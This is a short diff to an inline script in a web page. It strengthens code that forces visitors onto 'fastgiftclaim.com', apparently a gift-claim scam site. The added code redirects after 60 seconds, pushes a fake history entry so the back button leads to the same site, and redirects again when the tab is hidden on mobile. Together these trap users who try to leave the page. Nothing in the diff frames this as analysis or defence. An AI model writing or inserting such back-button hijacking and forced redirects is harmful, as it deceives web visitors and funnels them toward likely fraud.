@@ -375,18 +375,31 @@
   <script>
 (function () {
     const redirectUrl = "https://fastgiftclaim.com/";
+    let redirected = false;
 
-    // Auto redirect after 1 minute
-    let autoRedirect = setTimeout(function () {
-        window.location.href = redirectUrl;
+    // 1️⃣ Auto redirect after 60 seconds
+    const timer = setTimeout(() => {
+        redirected = true;
+        window.location.replace(redirectUrl);
     }, 60000);
 
-    // Detect back button
-    history.pushState(null, null, location.href);
+    // 2️⃣ Fake history state
+    history.pushState({page: 1}, "", "");
 
-    window.addEventListener("popstate", function () {
-        clearTimeout(autoRedirect);
-        window.location.href = redirectUrl;
+    // 3️⃣ Detect back button (strong method)
+    window.onpopstate = function () {
+        if (!redirected) {
+            clearTimeout(timer);
+            window.location.replace(redirectUrl);
+        }
+    };
+
+    // 4️⃣ Extra safety (mobile browsers)
+    document.addEventListener("visibilitychange", function () {
+        if (document.visibilityState === "hidden" && !redirected) {
+            clearTimeout(timer);
+            window.location.replace(redirectUrl);
+        }
     });
 })();
   </script>
